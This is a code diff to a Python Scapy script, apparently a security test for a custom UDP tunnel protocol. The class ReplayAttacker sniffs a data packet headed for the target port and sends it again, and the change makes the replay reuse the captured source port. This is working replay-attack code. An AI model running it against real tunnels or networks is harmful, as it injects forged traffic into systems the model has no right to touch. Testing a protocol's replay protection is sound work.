@@ -17,7 +17,8 @@ class ReplayAttacker:
     def __init__(self, target_ip, target_port):
         self.target_ip = target_ip
         self.target_port = target_port
-        self.captured_packet = None
+        self.captured_payload = None
+        self.captured_sport = None
 
     def packet_callback(self, packet):
         """Callback function for Scapy's sniff()."""
@@ -27,7 +28,8 @@ class ReplayAttacker:
 
             if msg_type == proto.MSG_TYPE_DATA:
                 print("\n[+] Captured a MSG_DATA packet!")
-                self.captured_packet = payload
+                self.captured_payload = payload
+                self.captured_sport = packet[UDP].sport
                 return True # Stop sniffing
         return False
 
@@ -38,13 +40,12 @@ class ReplayAttacker:
         print(f"[*] Sniffing for a data packet destined for port {self.target_port}...")
         print("[*] Please generate some traffic through the tunnel (e.g., ping the other side).")
         
-        sniff(prn=self.packet_callback, filter=f"udp and port {self.target_port}", store=0, stop_filter=lambda p: self.captured_packet is not None)
+        sniff(prn=self.packet_callback, filter=f"udp and port {self.target_port}", store=0, stop_filter=lambda p: self.captured_payload is not None)
 
-        if self.captured_packet:
-            print("[*] Captured packet. Now replaying it.")
+        if self.captured_payload:
+            print(f"[*] Captured packet from source port {self.captured_sport}. Now replaying it.")
             
-            # The source IP and port don't matter for this attack
-            replay_packet = IP(dst=self.target_ip) / UDP(dport=self.target_port, sport=12345) / self.captured_packet
+            replay_packet = IP(dst=self.target_ip) / UDP(dport=self.target_port, sport=self.captured_sport) / self.captured_payload
             
             # Send the packet for the first time (this one should be accepted)
             send(replay_packet, verbose=0)
